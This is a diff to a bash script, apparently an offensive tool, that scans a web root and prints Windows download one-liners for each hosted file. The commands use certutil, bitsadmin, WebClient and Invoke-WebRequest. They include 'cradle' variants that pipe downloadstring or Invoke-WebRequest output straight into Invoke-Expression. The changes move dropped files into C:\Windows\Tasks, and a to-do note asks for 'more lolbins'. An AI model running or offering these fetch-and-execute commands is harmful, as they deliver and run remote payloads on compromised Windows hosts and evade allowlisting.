@@ -142,26 +142,27 @@ while IFS= read -r -d '' FILE; do
 
     if [ "$ALL_MODE" = true ]; then 
 
-        # CERTUTIL
-        echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} ${FILE_NAME}"
-        # BITSADMIN
+        #### CERTUTIL
+        echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} C:\\Windows\\Tasks\\${FILE_NAME}"
+        
+        #### BITSADMIN
         echo "bitsadmin /create 1 bitsadmin /addfile 1 ${BASE_URL}${URL_PATH} c:\\Windows\\Tasks\\${FILE_NAME} bitsadmin /RESUME 1 bitsadmin /complete 1"
-        # WEBCLIENT
+        
+        #### WEBCLIENT
+        echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"C:\\Windows\\Tasks\\${FILE_NAME}\")"
         # Cradle Mode
-        echo "Invoke-Expression(New-Object Net.Webclient).DownloadFile(\'${BASE_URL}${URL_PATH}\')"
-        # Net.Webclient
-        echo "(New-Object System.Net.WebClient).DownloadFile(\'${BASE_URL}${URL_PATH}\', \'.\\${FILE_NAME}\')"
-        # IWR (default)
+        echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
+        
+        #### IWR
+        echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile C:\\Windows\\Tasks\\${FILE_NAME}"
         # Cradle Mode
         echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
-        # IWR
-        echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
    
     else
 
         # CERTUTIL
         if [ "$CERTUTIL_MODE" = true ]; then
-            echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} ${FILE_NAME}"
+            echo "certutil -urlcache -f ${BASE_URL}${URL_PATH} C:\\Windows\\Tasks\\${FILE_NAME}"
         # BITSADMIN
         elif [ "$BITSADMIN_MODE" = true ]; then
             echo "bitsadmin /create 1 bitsadmin /addfile 1 ${BASE_URL}${URL_PATH} c:\\Windows\\Tasks\\${FILE_NAME} bitsadmin /RESUME 1 bitsadmin /complete 1"
@@ -169,9 +170,9 @@ while IFS= read -r -d '' FILE; do
         elif [ "$WEBCLIENT_MODE" = true ]; then
             # Cradle Mode
             if [ "$CRADLE_MODE" = true ]; then
-                    echo "Invoke-Expression(New-Object Net.Webclient).DownloadFile(\"${BASE_URL}${URL_PATH}\")"
+                    echo "Invoke-Expression(New-Object Net.Webclient).downloadstring(\"${BASE_URL}${URL_PATH}\")"
                 else
-                    echo "(New-Object System.Net.WebClient).DownloadFile(\'${BASE_URL}${URL_PATH}\', \'.\\${FILE_NAME}\')"
+                    echo "(New-Object System.Net.WebClient).DownloadFile(\"${BASE_URL}${URL_PATH}\", \"C:\\Windows\\Tasks\\${FILE_NAME}\")"
             fi
         # IWR (default)
         else 
@@ -180,7 +181,7 @@ while IFS= read -r -d '' FILE; do
                 echo "Invoke-Expression(Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -UseBasicParsing)"
                 # IWR
             else
-                echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile .\\${FILE_NAME}"
+                echo "Invoke-WebRequest -Uri ${BASE_URL}${URL_PATH} -OutFile C:\\Windows\\Tasks\\${FILE_NAME}"
             fi
         fi
     fi
@@ -188,7 +189,8 @@ while IFS= read -r -d '' FILE; do
 done < <(find "$WEBROOT" -type f -print0)
 ) | sort 
 
-# TO-DO
+###############
+#### To-Do ####
+###############
 # Linux support
-# All mode
 # More lolbins
